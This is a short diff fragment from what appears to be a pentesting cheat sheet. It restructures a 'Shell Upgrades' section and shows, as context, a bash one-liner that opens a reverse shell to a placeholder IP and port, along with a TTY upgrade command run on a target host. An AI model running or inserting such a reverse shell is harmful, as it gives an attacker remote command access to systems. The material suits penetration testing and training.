@@ -7,7 +7,8 @@ Easy Bash
 ```
 bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
 ```
-* **Shell Upgrades**
+## Shell Upgrades
+* **Bash
   ```bash
   root@target:/backend# script /dev/null -c bash
   script /dev/null -c bash            
